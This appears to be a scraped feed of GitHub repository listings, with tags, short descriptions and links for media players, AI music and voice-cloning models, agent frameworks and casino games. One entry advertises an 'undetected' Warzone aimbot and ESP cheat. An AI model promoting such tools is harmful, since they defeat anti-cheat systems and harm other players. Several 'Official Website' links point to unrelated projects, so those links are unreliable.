-> **Categories:** `#dashboard` `#docker` `#feed_reader` `#golang` `#homepage` `#rss` `#self_hosted` `#github` `#SelfHosted` `#Productivity` `#go` `#aggregator` `#homelab` `#monitoring` `#reddit` `#rss_reader` `#startpage` `#youtube` `#OpenSource`
-
-A selfhosted dashboard that puts all your feeds in one place
-**Language**: Go
-
-- 🐙 **Source Code:** [https://github.com/glanceapp/glance](https://github.com/glanceapp/glance)
-- 🌐 **Official Website:** [https://github.com/open-webui/open-webui](https://github.com/open-webui/open-webui)
-- 👤 **Developer:** [glanceapp](https://github.com/glanceapp)
-
-
----
-
-### 📦 sebjvidal/Apple-Music-UI-Demo
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-**Language**: Swift
-**Stars**: 177 **Issues**: 0 **Forks**: 10
-[https://github.com/sebjvidal/Apple-Music-UI-Demo](https://github.com/sebjvidal/Apple-Music-UI-Demo)
-
-- 🐙 **Source Code:** [https://github.com/sebjvidal/Apple-Music-UI-Demo](https://github.com/sebjvidal/Apple-Music-UI-Demo)
-- 👤 **Developer:** [sebjvidal](https://github.com/sebjvidal)
-
-
----
-
-### 📦 BradyFU/Video-MME
-
-> **Categories:** `#large_language_models` `#large_vision_language_models` `#mme` `#multimodal_large_language_models` `#video` `#video_mme`
-
-✨✨Video-MME: The First-Ever Comprehensive Evaluation Benchmark of Multi-modal LLMs in Video Analysis
-**Language**: Python
-
-- 🐙 **Source Code:** [https://github.com/BradyFU/Video-MME](https://github.com/BradyFU/Video-MME)
-- 👤 **Developer:** [BradyFU](https://github.com/BradyFU)
-
-
----
-
-### 📦 jthlim/impulse-tracker
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-Original source code for Impulse Tracker, a music tracker for DOS
-**Language**: Assembly
-**Stars**: 269 **Issues**: 0 **Forks**: 10
-[https://github.com/jthlim/impulse-tracker](https://github.com/jthlim/impulse-tracker)
-
-- 🐙 **Source Code:** [https://github.com/jthlim/impulse-tracker](https://github.com/jthlim/impulse-tracker)
-- 👤 **Developer:** [jthlim](https://github.com/jthlim)
-
-
----
-
-### 📦 jishengpeng/WavTokenizer
-
-> **Categories:** `#acoustic` `#audio_representation` `#codec` `#dac` `#encodec` `#gpt4o` `#music_representation_learning` `#semantic` `#soundstream` `#speech_language_model` `#speech_representation` `#text_to_speech`
-
-SOTA discrete acoustic codec models with 40 tokens per second for audio language modeling
-**Language**: Python
-
-- 🐙 **Source Code:** [https://github.com/jishengpeng/WavTokenizer](https://github.com/jishengpeng/WavTokenizer)
-- 👤 **Developer:** [jishengpeng](https://github.com/jishengpeng)
-
-
----
-
-### 📦 SuperViz/superviz
-
-> **Categories:** `#autodesk` `#autodesk_forge` `#collaboration` `#comments` `#crdt` `#matterport` `#multiplayer` `#presence` `#react` `#reactflow` `#real_time` `#superviz` `#three` `#video_conferencing` `#webrtc` `#websockets` `#yjs` `#yjs_provider` `#GitHub` `#OpenSource`
-
-SuperViz provides programmable low-code Collaboration and Communication components for web applications.
-**Language**: TypeScript
-
-- 🐙 **Source Code:** [https://github.com/SuperViz/superviz](https://github.com/SuperViz/superviz)
-- 👤 **Developer:** [SuperViz](https://github.com/SuperViz)
-
-
----
-
-### 📦 leerob/next-music-player
-
-> **Categories:** `#nextjs` `#GitHub` `#OpenSource`
-
-A blazing fast, information dense media player built with Next.js.
-**Language**: TypeScript
-
-- 🐙 **Source Code:** [https://github.com/leerob/next-music-player](https://github.com/leerob/next-music-player)
-- 👤 **Developer:** [leerob](https://github.com/leerob)
-
-
----
-
-### 📦 WinampDesktop/winamp
-
-> **Categories:** `#llama` `#media` `#player` `#winamp`
-
-Iconic media player
-**Language**: C++
-
-- 🐙 **Source Code:** [https://github.com/WinampDesktop/winamp](https://github.com/WinampDesktop/winamp)
-- 👤 **Developer:** [WinampDesktop](https://github.com/WinampDesktop)
-
-
----
-
-### 📦 saulamsal/apple-music-sheet-ui
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-**Language**: TypeScript
-**Stars**: 204 **Issues**: 0 **Forks**: 28
-[https://github.com/saulamsal/apple-music-sheet-ui](https://github.com/saulamsal/apple-music-sheet-ui)
-
-- 🐙 **Source Code:** [https://github.com/saulamsal/apple-music-sheet-ui](https://github.com/saulamsal/apple-music-sheet-ui)
-- 👤 **Developer:** [saulamsal](https://github.com/saulamsal)
-
-
----
-
-### 📦 Pushan2005/SpotTransfer
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-Spotify to YT-Music Migration Tool
-**Language**: TypeScript
-**Stars**: 129 **Issues**: 1 **Forks**: 4
-[https://github.com/Pushan2005/SpotTransfer](https://github.com/Pushan2005/SpotTransfer)
-
-- 🐙 **Source Code:** [https://github.com/Pushan2005/SpotTransfer](https://github.com/Pushan2005/SpotTransfer)
-- 👤 **Developer:** [Pushan2005](https://github.com/Pushan2005)
-
-
----
-
-### 📦 multimodal-art-projection/YuE
-
-> **Categories:** `#agi` `#ai` `#artificial_intelligence` `#deep_learning` `#foundation_models` `#llm` `#music_generation`
-
-YuE: Open Full-song Music Generation Foundation Model, something similar to Suno.ai but open
-**Language**: Python
-
-- 🐙 **Source Code:** [https://github.com/multimodal-art-projection/YuE](https://github.com/multimodal-art-projection/YuE)
-- 👤 **Developer:** [multimodal-art-projection](https://github.com/multimodal-art-projection)
-
-
----
-
-### 📦 antfu/shiki-stream
-
-> **Categories:** `#llm` `#stream` `#syntax_highlighting`
-
-Streaming highlighting with Shiki. Useful for highlighting text streams like LLM outputs.
-**Language**: HTML
-
-- 🐙 **Source Code:** [https://github.com/antfu/shiki-stream](https://github.com/antfu/shiki-stream)
-- 👤 **Developer:** [antfu](https://github.com/antfu)
-
-
----
-
-### 📦 liuff19/Video-T1
-
-> **Categories:** `#aigc` `#chain_of_thought` `#test_time_scaling` `#video` `#video_generation`
-
-Official Implementation of Video-T1: Test-Time Scaling for Video Generation
-**Language**: Python
-
-- 🐙 **Source Code:** [https://github.com/liuff19/Video-T1](https://github.com/liuff19/Video-T1)
-- 👤 **Developer:** [liuff19](https://github.com/liuff19)
-
-
----
-
-### 📦 hanyang-21/VideoScene
-
-> **Categories:** `#3d_reconstruction` `#video` `#video_generation`
-
-[CVPR 2025] VideoScene: Distilling Video Diffusion Model to Generate 3D Scenes in One Step
-**Language**: Python
-
-- 🐙 **Source Code:** [https://github.com/hanyang-21/VideoScene](https://github.com/hanyang-21/VideoScene)
-- 👤 **Developer:** [hanyang-21](https://github.com/hanyang-21)
-
-
----
-
-### 📦 bytedance/deer-flow
-
-> **Categories:** `#agent` `#agentic` `#agentic_framework` `#agentic_workflow` `#ai` `#ai_agents` `#bytedance` `#deep_research` `#langchain` `#langgraph` `#langmanus` `#llm` `#multi_agent` `#nodejs` `#podcast` `#python` `#typescript` `#readme` `#superagent` `#harness` `#GitHub` `#OpenSource`
-
-DeerFlow is a community-driven framework for deep research, combining language models with tools like web search, crawling, and Python execution, while contributing back to the open-source community.
-**Language**: TypeScript
-
-- 🐙 **Source Code:** [https://github.com/bytedance/deer-flow](https://github.com/bytedance/deer-flow)
-- 🌐 **Official Website:** [https://deerflow.tech](https://deerflow.tech)
-- 👤 **Developer:** [bytedance](https://github.com/bytedance)
-
-
----
-
-### 📦 cheats-warzone/warzone-cheats
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-Warzone Cheat: Unlock your full potential with this undetected Aimbot features. Featuring the most advanced Warzone Aimbot, ESP, Radar, Skinchanger, and Unlock All Tool. Dominate every lobby with safe, precise, and user-friendly enhancements. Join thousands of players upgrading their Warzone experience.
-**Language**: C++
-**Stars**: 197 **Issues**: 0 **Forks**: 0
-[https://github.com/cheats-warzone/warzone-cheats](https://github.com/cheats-warzone/warzone-cheats)
-
-- 🐙 **Source Code:** [https://github.com/cheats-warzone/warzone-cheats](https://github.com/cheats-warzone/warzone-cheats)
-- 👤 **Developer:** [cheats-warzone](https://github.com/cheats-warzone)
-
-
----
-
-### 📦 Jstudner/jcorp-nomad
-
-> **Categories:** `#dlna` `#esp32` `#homelab` `#jellyfin` `#low_power` `#media_server` `#offline_server` `#selfhosted` `#server` `#usb_server` `#wifi_hotspot`
-
-An extremely compact offline media server for Movies, Shows, Books, and Music.
-**Language**: HTML
-
-- 🐙 **Source Code:** [https://github.com/Jstudner/jcorp-nomad](https://github.com/Jstudner/jcorp-nomad)
-- 👤 **Developer:** [Jstudner](https://github.com/Jstudner)
-
-
----
-
-### 📦 vercel/streamdown
-
-> **Categories:** `#ai` `#markdown` `#streaming` `#GitHub` `#OpenSource`
-
-A drop-in replacement for react-markdown, designed for AI-powered streaming.
-**Language**: TypeScript
-
-- 🐙 **Source Code:** [https://github.com/vercel/streamdown](https://github.com/vercel/streamdown)
-- 👤 **Developer:** [vercel](https://github.com/vercel)
-
-
----
-
-### 📦 cedardb/DOOMQL
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-A multiplayer DOOM-like in pure SQL
-**Language**: Python
-**Stars**: 268 **Issues**: 2 **Forks**: 11
-[https://github.com/cedardb/DOOMQL](https://github.com/cedardb/DOOMQL)
-
-- 🐙 **Source Code:** [https://github.com/cedardb/DOOMQL](https://github.com/cedardb/DOOMQL)
-- 👤 **Developer:** [cedardb](https://github.com/cedardb)
-
-
----
-
-### 📦 OpenBMB/VoxCPM
-
-> **Categories:** `#GitHub` `#OpenSource` `#readme` `#audio` `#python` `#text_to_speech` `#speech` `#pytorch` `#tts` `#speech_synthesis` `#deeplearning` `#voice_cloning` `#tts_model` `#minicpm`
-
-VoxCPM: Tokenizer-Free TTS for Context-Aware Speech Generation and True-to-Life Voice Cloning
-**Language**: Python
-**Stars**: 298 **Issues**: 4 **Forks**: 28
-[https://github.com/OpenBMB/VoxCPM](https://github.com/OpenBMB/VoxCPM)
-
-- 🐙 **Source Code:** [https://github.com/OpenBMB/VoxCPM](https://github.com/OpenBMB/VoxCPM)
-- 👤 **Developer:** [OpenBMB](https://github.com/OpenBMB)
-
-
----
-
-### 📦 wildminder/ComfyUI-VoxCPM
-
-> **Categories:** `#ai_voice` `#audio` `#comfyui_node` `#t2s` `#text_to_speech` `#tts` `#voice_cloning` `#voice_generation`
-
-ComfyUI node for highly expressive speech and realistic zero-shot voice cloning
-**Language**: Python
-
-- 🐙 **Source Code:** [https://github.com/wildminder/ComfyUI-VoxCPM](https://github.com/wildminder/ComfyUI-VoxCPM)
-- 👤 **Developer:** [wildminder](https://github.com/wildminder)
-
-
----
-
-### 📦 ryanntannn/zustand-sync
-
-> **Categories:** `#multiplayer` `#state_management` `#zustand`
-
-A simple, barebones "multiplayer" middleware for zustand
-**Language**: TypeScript
-
-- 🐙 **Source Code:** [https://github.com/ryanntannn/zustand-sync](https://github.com/ryanntannn/zustand-sync)
-- 👤 **Developer:** [ryanntannn](https://github.com/ryanntannn)
-
-
----
-
-### 📦 devcarron/casino-games-web3
-
-> **Categories:** `#bep_20` `#binance` `#bitcoin` `#blockchain` `#casino` `#casino_game` `#chatroom` `#crash` `#erc_20` `#ethereum` `#game` `#mines` `#plinko` `#scissors` `#slot` `#solana` `#trc_20` `#tron` `#turtle` `#web3`
-
-casino games blockchain, multichain, solana, ethereum, bitcoin, ethereum, binance, tron, erc-20, bep-20, trc-20, A modern crypto-powered gaming platform supporting multi-chain tokens and exciting on-chain games. This platform provides a comprehensive gaming experience with real-time multiplayer gameplay, secure wallet integration.
-**Language**: JavaScript
-
-- 🐙 **Source Code:** [https://github.com/devcarron/casino-games-web3](https://github.com/devcarron/casino-games-web3)
-- 👤 **Developer:** [devcarron](https://github.com/devcarron)
-
-
----
-
-### 📦 FunAudioLLM/Fun-ASR
-
-> **Categories:** `#audio` `#audio_language_model` `#audio_understanding` `#fun_asr` `#multimodal_large_language_models` `#pytorch` `#speaker_diarization` `#speech_recognition` `#GitHub` `#OpenSource`
-
-Fun-ASR is an end-to-end speech recognition large model launched by Tongyi Lab.
-**Language**: Python
-
-- 🐙 **Source Code:** [https://github.com/FunAudioLLM/Fun-ASR](https://github.com/FunAudioLLM/Fun-ASR)
-- 👤 **Developer:** [FunAudioLLM](https://github.com/FunAudioLLM)
-
-
----
-
-### 📦 remorses/tuitube
-
-> **Categories:** `#GitHub` `#OpenSource` `#python` `#YouTube`
-
-Download videos from the command line with a TUI
-**Language**: TypeScript
-**Stars**: 299 **Issues**: 1 **Forks**: 9
-[https://github.com/remorses/tuitube](https://github.com/remorses/tuitube)
-
-- 🐙 **Source Code:** [https://github.com/remorses/tuitube](https://github.com/remorses/tuitube)
-- 👤 **Developer:** [remorses](https://github.com/remorses)
-
-
----
-
-### 📦 ronitsingh10/FineTune
-
-> **Categories:** `#audio` `#audio_utility` `#macos` `#macos_app` `#menu_bar` `#menubar` `#menubar_app` `#swift` `#swiftui` `#utility`
-
-FineTune, a macOS menu bar app to control volume for each app independently, route apps to different output devices, and apply EQ
-**Language**: Swift
-
-- 🐙 **Source Code:** [https://github.com/ronitsingh10/FineTune](https://github.com/ronitsingh10/FineTune)
-- 👤 **Developer:** [ronitsingh10](https://github.com/ronitsingh10)
-
-
----
-
-### 📦 mvanhorn/last30days-skill
-
-> **Categories:** `#ai_prompts` `#claude` `#claude_code` `#reddit` `#twitter` `#readme` `#instagram` `#youtube` `#social_media` `#research` `#hackernews` `#trends` `#web_search` `#bluesky` `#recency` `#tiktok` `#polymarket` `#deep_research` `#ai_skill` `#openclaw` `#clawhub` `#GitHub` `#OpenSource` `#python`
-
-Claude Code skill that researches any topic across Reddit + X from the last 30 days, then writes copy-paste-ready prompts
-**Language**: Python
-
-- 🐙 **Source Code:** [https://github.com/mvanhorn/last30days-skill](https://github.com/mvanhorn/last30days-skill)
-- 👤 **Developer:** [mvanhorn](https://github.com/mvanhorn)
-
-
----
-
-### 📦 fspecii/ace-step-ui
-
-> **Categories:** `#ace_step` `#ai` `#ai_music` `#local_first` `#music` `#music_generation` `#open_source` `#react` `#suno_alternative` `#typescript` `#readme` `#javascript`
-
-🎵 The Ultimate Open Source Suno Alternative - Professional UI for ACE-Step 1.5 AI Music Generation. Free, local, unlimited. Stop paying for Suno!
-**Language**: JavaScript
-
-- 🐙 **Source Code:** [https://github.com/fspecii/ace-step-ui](https://github.com/fspecii/ace-step-ui)
-- 🌐 **Official Website:** [https://github.com/fspecii/ace-step-ui#readme](https://github.com/fspecii/ace-step-ui#readme)
-- 👤 **Developer:** [fspecii](https://github.com/fspecii)
-
-
----
-
-### 📦 f/textream
-
-> **Categories:** `#macos` `#macos_app` `#streaming`
-
-Textream is a free macOS teleprompter app for streamers, interviewers, and presenters. It highlights your script in real-time as you speak, displayed in a beautiful Dynamic Island overlay.
-**Language**: Swift
-
-- 🐙 **Source Code:** [https://github.com/f/textream](https://github.com/f/textream)
-- 👤 **Developer:** [f](https://github.com/f)
-
-
----
-
-### 📦 LCEMP/LCEMP
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-A fork of minecraft LCE with LAN multiplayer support and other fixes.
-**Language**: C++
-**Stars**: 703 **Issues**: 49 **Forks**: 94
-[https://github.com/LCEMP/LCEMP](https://github.com/LCEMP/LCEMP)
-
-- 🐙 **Source Code:** [https://github.com/LCEMP/LCEMP](https://github.com/LCEMP/LCEMP)
-- 👤 **Developer:** [LCEMP](https://github.com/LCEMP)
-
-
----
-
-### 📦 MrsEWE44/musicDownload
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-**Language**: Python
-**Stars**: 556 **Issues**: 2 **Forks**: 70
-[https://github.com/MrsEWE44/musicDownload](https://github.com/MrsEWE44/musicDownload)
-
-- 🐙 **Source Code:** [https://github.com/MrsEWE44/musicDownload](https://github.com/MrsEWE44/musicDownload)
-- 👤 **Developer:** [MrsEWE44](https://github.com/MrsEWE44)
-
-
----
-
-### 📦 tddworks/baguette
-
-> **Categories:** `#agent` `#apple` `#cli` `#devicefarm` `#indigohid` `#ios` `#simulator` `#simulatorkit` `#streaming`
-
-Headless iOS Simulator manager/farm + host-side input injection for iOS 26 — taps, swipes, multi-finger gestures, and 60 fps streaming
-**Language**: Swift
-
-- 🐙 **Source Code:** [https://github.com/tddworks/baguette](https://github.com/tddworks/baguette)
-- 👤 **Developer:** [tddworks](https://github.com/tddworks)
-
-
----
-
-### 📦 osulazerdownload/osulazer
-
-> **Categories:** `#beatmap` `#osu_game` `#osu_lazer` `#osu_mania` `#osu_skin` `#osu_skins` `#osugame` `#osumania`
-
-osu mania download skin lazer map open source rhythm game windows 11 macos linux android ios mobile default client latest version 2026 download beatmaps skins custom rulesets multiplayer free
-**Language**: C#
-
-- 🐙 **Source Code:** [https://github.com/osulazerdownload/osulazer](https://github.com/osulazerdownload/osulazer)
-- 👤 **Developer:** [osulazerdownload](https://github.com/osulazerdownload)
-
-
----
-
-### 📦 IvanSobolev/Neo3dEngine
-
-> **Categories:** `#3d_engine` `#console_app` `#csharp` `#custom_network_protocol` `#dotnet` `#game_engine` `#game_engine_3d` `#multiplayer` `#raycasting` `#raycasting_engine` `#tcp_socket`
-
-A minimalist CPU-based 3D console engine in C# (.NET 8) built from scratch. Features Raycasting/Raytracing, dynamic lighting & shadows, .obj loader, and custom TCP-based multiplayer with real-time chat. No external graphics APIs.
-**Language**: C#
-
-- 🐙 **Source Code:** [https://github.com/IvanSobolev/Neo3dEngine](https://github.com/IvanSobolev/Neo3dEngine)
-- 👤 **Developer:** [IvanSobolev](https://github.com/IvanSobolev)
-
-
----
-
-### 📦 xxniiinxx/coinflip-casino-game
-
-> **Categories:** `#anchor` `#betting` `#blockchain_game` `#casino` `#coinflip` `#cryptocurrency` `#defi` `#fullstack` `#gambling` `#mongodb`
-
-A full-stack, peer-to-peer coinflip betting casino game on Solana. Players connect a wallet, create or join on-chain game rooms, and compete head-to-head for 2× the stake. The UI updates in real time over WebSockets, outcomes are resolved on-chain with Orao VRF, and the backend tracks rooms, chat, and match history in MongoDB.
-**Language**: TypeScript
-
-- 🐙 **Source Code:** [https://github.com/xxniiinxx/coinflip-casino-game](https://github.com/xxniiinxx/coinflip-casino-game)
-- 👤 **Developer:** [xxniiinxx](https://github.com/xxniiinxx)
-
-
----
-
-### 📦 mesamirh/MovieBox-Tui
-
-> **Categories:** `#anime` `#moviebox` `#moviebox_api` `#streaming`
-
-A modern Rust based terminal user interface for MovieBox. Fast, lightweight, keyboard first, and cross-platform.
-**Language**: Rust
-
-- 🐙 **Source Code:** [https://github.com/mesamirh/MovieBox-Tui](https://github.com/mesamirh/MovieBox-Tui)
-- 👤 **Developer:** [mesamirh](https://github.com/mesamirh)
-
-
----
-
-### 📦 yc-software/qm
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-Multiplayer agent harness for work
-**Language**: TypeScript
-**Stars**: 2864 **Issues**: 37 **Forks**: 262
-[https://github.com/yc-software/qm](https://github.com/yc-software/qm)
-
-- 🐙 **Source Code:** [https://github.com/yc-software/qm](https://github.com/yc-software/qm)
-- 👤 **Developer:** [yc-software](https://github.com/yc-software)
-
-
----
-
-### 📦 wassgha/rescript
-
-> **Categories:** `#audio` `#media` `#media_editing` `#media_editor` `#transcribe` `#transcription` `#video` `#video_editing` `#video_editor` `#video_processing`
-
-🎬 Open source, transcript-based video/audio editor that lives in the browser.
-**Language**: TypeScript
-
-- 🐙 **Source Code:** [https://github.com/wassgha/rescript](https://github.com/wassgha/rescript)
-- 👤 **Developer:** [wassgha](https://github.com/wassgha)
-
-
----
-
-### 📦 tldraw / tldraw
-
-> **Categories:** `#GitHub` `#OpenSource` `#readme` `#react` `#drawing` `#design` `#sync` `#sdk` `#canvas` `#diagram` `#multiplayer` `#sketch` `#collaboration` `#whiteboard` `#infinite`
-
-A** tiny little drawing app.
-
-Creator: tldraw
-Stars ⭐️: 8.1k
-Forked By: 422
-
-- 🐙 **Source Code:** [https://github.com/tldraw/tldraw](https://github.com/tldraw/tldraw)
-- 🌐 **Official Website:** [https://tldraw.dev](https://tldraw.dev)
-- 👤 **Developer:** tldraw
-
-
----
-
-### 📦 obsproject/obs-studio
-
-> **Categories:** `#GitHub` `#OpenSource` `#readme` `#c` `#c_plus_plus` `#ffmpeg` `#live_streaming` `#video_recording` `#screen_capture` `#twitch_tv` `#directshow` `#facebook_live` `#youtube_live` `#game_capture` `#Streaming` `#Screen` `#Recording`
-
-OBS Studio - Free and open source software for live streaming and screen recording
-
-Creator: OBS
-Stars ⭐️: 40.7k
-Forked By: 6.2k
-
-- 🐙 **Source Code:** [https://github.com/obsproject/obs-studio](https://github.com/obsproject/obs-studio)
-- 🌐 **Official Website:** [https://obsproject.com](https://obsproject.com)
-- 👤 **Developer:** OBS
-
-
----
-
-### 📦 ytdl-org/youtube-dl
-
-> **Categories:** `#youtube` `#cmd` `#readme`
-
-Command**-line program to download videos from YouTube.com and other video sites
-
-Creator:  youtube-dl
-Stars ⭐️: 118k
-Forked By: 8.7k
-https://github.com/ytdl-org/youtube-dl
-
-- 🐙 **Source Code:** [https://github.com/ytdl-org/youtube-dl](https://github.com/ytdl-org/youtube-dl)
-- 🌐 **Official Website:** [https://github.com/ytdl-org/youtube-dl](https://github.com/ytdl-org/youtube-dl)
-- 👤 **Developer:** youtube-dl
-
-
----
-
-### 📦 AudioGPT
-
-> **Categories:** `#AudioGPT` `#gpt`
-
-**AudioGPT: Understanding and Generating Speech, Music, Sound, and Talking Head
-
-Creator:  AIGC-Audio
-Stars ⭐️: 2.1k
-Forked By: 158
-https://github.com/AIGC-Audio/AudioGPT
-
-- 🐙 **Source Code:** [https://github.com/AIGC-Audio/AudioGPT](https://github.com/AIGC-Audio/AudioGPT)
-- 👤 **Developer:** AIGC-Audio
-
-
----
-
-### 📦 Track-Anything
-
-> **Categories:** `#tracking` `#xmem` `#Interesting` `#Video`
-
-Track**-Anything is a flexible and interactive tool for video object tracking and segmentation, based on Segment Anything, XMem, and E2FGVI.
-
-Creator:  Mingqi Gao
-Stars ⭐️: 3.2k
-Forked By: 174
-https://github.com/gaomingqi/Track-Anything
-
-- 🐙 **Source Code:** [https://github.com/gaomingqi/Track-Anything](https://github.com/gaomingqi/Track-Anything)
-- 👤 **Developer:** Mingqi Gao
-
-
----
-
-### 📦 OpenVoice
-
-> **Categories:** `#GitHub` `#OpenSource` `#readme` `#text_to_speech` `#tts` `#voice_clone` `#zero_shot_tts` `#python` `#Interesting` `#AI` `#Tool` `#Useful` `#Audio`
-
-**Instant voice cloning by MyShell.
-
-Creator: myshell-ai
-Stars ⭐️: 7.8k
-Forked By: 542
-
-- 🐙 **Source Code:** [https://github.com/myshell-ai/OpenVoice](https://github.com/myshell-ai/OpenVoice)
-- 🌐 **Official Website:** [https://github.com/myshell-ai/OpenVoice#readme](https://github.com/myshell-ai/OpenVoice#readme)
-- 👤 **Developer:** myshell-ai
-
-
----
-
-### 📦 MoneyPrinter
-
-> **Categories:** `#GitHub` `#OpenSource` `#python` `#automation` `#cli` `#json` `#money` `#outreach` `#twitter` `#youtube`
-
-**Automate Creation of YouTube Shorts using MoviePy.
-
-Creator: FujiwaraChoki
-Stars ⭐️: 7.1k
-Forked By: 844
-
-- 🐙 **Source Code:** [https://github.com/FujiwaraChoki/MoneyPrinter](https://github.com/FujiwaraChoki/MoneyPrinter)
-- 👤 **Developer:** FujiwaraChoki
-
-
----
-
-### 📦 10 GitHub Repositories to Master SQL
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-10 GitHub repositories that can help you get started with SQL and database management and even take your skills to the next level. This list is for beginners and professionals who are looking to improve their data-handling skills.
-
-1.** SQL 101 by s-shemmee**
-https://github.com/s-shemmee/SQL-101
-
-2. **Learn SQL by WebDevSimplified**
-https://github.com/WebDevSimplified/Learn-SQL
-
-3. **SQL Masterclass by datawithdanny**
-https://github.com/datawithdanny/sql-masterclass
-
-4. **SQL Map by sqlmapproject**
-https://github.com/sqlmapproject/sqlmap
-
-5. **SQL Server Samples by Microsoft**
-https://github.com/microsoft/sql-server-samples
-
-6. **SQL Music Store Analysis Project by rishabhnmishra**
-https://github.com/rishabhnmishra/SQL_Music_Store_Analysis
-
-7. **Data Engineering Zoomcamp by DataTalksClub**
-https://github.com/DataTalksClub/data-engineering-zoomcamp
-
-8. **SQL Server Kit by ktaranov**
-https://github.com/ktaranov/sqlserver-kit
-
-9. **Awesome DB Tools by mgramin**
-https://github.com/mgramin/awesome-db-tools
-
-10. **SQL for Wary Data Scientists by gvwilson**
-https://github.com/gvwilson/sql-tutorial
-
-
-➖➖➖➖➖➖➖➖➖➖➖➖➖➖
-Join @github_repositories_bds for more cool repositories.
-*This channel belongs to @bigdataspecialist group
-
-- 🐙 **Source Code:** [https://github.com/s-shemmee/SQL-101](https://github.com/s-shemmee/SQL-101)
-- 🌐 **Official Website:** [https://github.com/WebDevSimplified/Learn-SQL](https://github.com/WebDevSimplified/Learn-SQL)
-- 👤 **Developer:** [s-shemmee](https://github.com/s-shemmee)
-
-
----
-
-### 📦 Amphion
-
-> **Categories:** `#toolkit` `#python` `#audio_generation` `#audio_synthesis` `#audioldm` `#audit` `#fastspeech2` `#hifi_gan` `#music_generation` `#naturalspeech2` `#singing_voice_conversion` `#speech_synthesis` `#text_to_audio` `#text_to_speech` `#vall_e` `#vits` `#voice_conversion` `#GitHub` `#OpenSource`
-
-Amphion (/æmˈfaɪən/) is a toolkit for Audio, Music, and Speech Generation. Its purpose is to support reproducible research and help junior researchers and engineers get started in the field of audio, music, and speech generation research and development.
-
-Creator: OpenMMLab
-Stars ⭐️: 7.4k
-Forked By: 550
-https://github.com/open-mmlab/Amphion
-
-- 🐙 **Source Code:** [https://github.com/open-mmlab/Amphion](https://github.com/open-mmlab/Amphion)
-- 👤 **Developer:** OpenMMLab
-
-
----
-
-### 📦 Agent-S
-
-> **Categories:** `#github` `#readme` `#memory` `#planning` `#cua` `#ai_agents` `#grounding` `#computer_automation` `#mllm` `#retrieval_augmented_generation` `#in_context_reinforcement_learning` `#agent_computer_interface` `#gui_agents` `#computer_use` `#computer_use_agent` `#OpenSource` `#python` `#agents` `#ai` `#multimodal` `#real_time` `#video` `#voice` `#voice_assistant` `#typescript` `#cloudflare` `#durable_objects` `#workflows` `#jupyter_notebook` `#anthropic` `#anthropic_claude` `#automation` `#claude` `#claude_code` `#claude_code_cli` `#claude_code_commands` `#claude_code_plugin` `#claude_code_plugins` `#claude_code_subagents` `#claude_skills` `#claudecode` `#claudecode_config` `#claudecode_subagents` `#orchestration` `#sub_agents` `#subagents`
-
-**
-Agent S: an open agentic framework that uses computers like a human
-
-Creator:   Simular-AI
-Stars ⭐️:  3,865
-Forked by: 377
-
-- 🐙 **Source Code:** [https://github.com/simular-ai/Agent-S](https://github.com/simular-ai/Agent-S)
-- 🌐 **Official Website:** [https://github.com/open-webui/open-webui](https://github.com/open-webui/open-webui)
-- 👤 **Developer:** Simular-AI
-
-
----
-
-### 📦 MusicGPT
-
-> **Categories:** `#music` `#LLM` `#GitHub` `#OpenSource`
-
-MusicGPT is an application that allows you to run the latest music generation AI models locally, in any platform and without using heavy dependencies like Python or machine learning frameworks.
-
-Creator:  gabotechs
-Stars ⭐️:  1,000
-Forked by: 135
-
-- 🐙 **Source Code:** [https://github.com/gabotechs/MusicGPT](https://github.com/gabotechs/MusicGPT)
-- 👤 **Developer:** gabotechs
-
-
----
-
-### 📦 LocalAI
-
-> **Categories:** `#LLM` `#opensource` `#readme` `#api` `#ai` `#mcp` `#decentralized` `#text_generation` `#distributed` `#tts` `#image_generation` `#llama` `#object_detection` `#mamba` `#libp2p` `#gemma` `#mistral` `#audio_generation` `#stable_diffusion` `#rwkv` `#musicgen` `#rerank` `#cplusplus` `#gpt4all` `#kubernetes` `#llama3` `#p2p` `#GitHub`
-
-The free, Open Source alternative to OpenAI, Claude and others. Self-hosted and local-first. Drop-in replacement for OpenAI, running on consumer-grade hardware. No GPU required. Runs gguf, transformers, diffusers and many more.
-
-- 🐙 **Source Code:** [https://github.com/mudler/LocalAI](https://github.com/mudler/LocalAI)
-- 🌐 **Official Website:** [https://localai.io](https://localai.io)
-- 👤 **Developer:** mudler
-
-
----
-
-### 📦 iptv
-
-> **Categories:** `#tvchannel` `#streaming` `#public` `#readme` `#playlist` `#tv` `#streams` `#iptv` `#m3u` `#GitHub` `#OpenSource` `#javascript` `#python` `#help_wanted` `#looking_for_contributors`
-
-This repository maintains an extensive collection of over 8,000 publicly accessible IPTV channels organized into neatly structured M3U playlists. These aren't pirated streams or sketchy links. They're legitimate public channels that broadcast freely online. The project categorizes everything by country, language, and content type, making it simple to find exactly what you're looking for.
-
-Creator:   iptv
-Stars ⭐️:  101,000
-Forked by:  4,000
-
-- 🐙 **Source Code:** [https://github.com/iptv-org/iptv](https://github.com/iptv-org/iptv)
-- 🌐 **Official Website:** [https://iptv-org.github.io](https://iptv-org.github.io)
-- 👤 **Developer:** iptv
-
-
----
-
-### 📦 SmartTube
-
-> **Categories:** `#YouTube` `#Android` `#TVApp`
-
-SmartTube is a free, standalone Android TV application that provides a familiar YouTube interface while stripping out ads and enabling features typically locked behind a YouTube Premium subscription. It connects directly to YouTube's services, so you have full access to your subscriptions, playlists, and history, but it intercepts and blocks the video ads server-side before they ever reach your screen.
-
-Creator:   yuliskov
-Stars ⭐️:  26,000
-Forked by:  1,000
-
-- 🐙 **Source Code:** [https://github.com/yuliskov/SmartTube](https://github.com/yuliskov/SmartTube)
-- 👤 **Developer:** yuliskov
-
-
----
-
-### 📦 pathway
-
-> **Categories:** `#GitHub` `#OpenSource` `#readme` `#python` `#rust` `#streaming` `#real_time` `#kafka` `#etl` `#machine_learning_algorithms` `#stream_processing` `#data_analytics` `#dataflow` `#data_processing` `#data_pipelines` `#batch_processing` `#pathway` `#iot_analytics` `#etl_framework` `#time_series_analysis`
-
-Python ETL framework for stream processing, real-time analytics, LLM pipelines, and RAG.
-
-Creator:   pathwaycom
